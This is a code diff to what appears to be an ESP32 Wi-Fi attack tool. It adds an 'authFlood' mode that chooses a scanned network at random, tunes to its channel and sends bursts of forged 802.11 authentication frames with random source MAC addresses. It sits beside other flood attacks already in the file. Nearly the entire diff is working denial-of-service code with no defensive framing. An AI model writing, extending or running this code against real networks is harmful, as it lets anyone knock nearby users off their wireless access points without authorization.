@@ -101,6 +101,10 @@ void PacketSniffer::probeFlood() {
     startAttack(4, 10000); // Default 10s
 }
 
+void PacketSniffer::authFlood() {
+    startAttack(5, 10000); // Default 10s
+}
+
 void PacketSniffer::init(SDManager *sd) {
     sdManager = sd;
     globalSniffer = this;
@@ -264,6 +268,37 @@ void PacketSniffer::loop() {
 
                  esp_wifi_80211_tx(WIFI_IF_STA, packet, idx, false);
                  delay(5);
+            }
+            else if (attackType == 5) { // Auth Flood
+                if (networkCount > 0) {
+                    int target = random(0, networkCount);
+                    // Switch channel
+                    esp_wifi_set_channel(networks[target].channel, WIFI_SECOND_CHAN_NONE);
+
+                    uint8_t packet[30];
+                    memset(packet, 0, 30);
+
+                    packet[0] = 0xB0; // Auth frame
+
+                    // Random SA
+                    uint8_t sa[6];
+                    for(int i=0; i<6; i++) sa[i] = random(0, 256);
+                    sa[0] &= 0xFE; sa[0] |= 0x02;
+
+                    memcpy(&packet[4], networks[target].bssid, 6); // DA = BSSID
+                    memcpy(&packet[10], sa, 6); // SA = Random
+                    memcpy(&packet[16], networks[target].bssid, 6); // BSSID
+
+                    // Auth Body (Open System, Seq 1, Status 0)
+                    packet[24] = 0x00; packet[25] = 0x00; // Algo
+                    packet[26] = 0x01; packet[27] = 0x00; // Seq
+                    packet[28] = 0x00; packet[29] = 0x00; // Status
+
+                    for(int k=0; k<5; k++) { // Burst
+                        esp_wifi_80211_tx(WIFI_IF_STA, packet, 30, false);
+                        delay(2);
+                    }
+                }
             }
         }
         return; // Skip sniffing while attacking
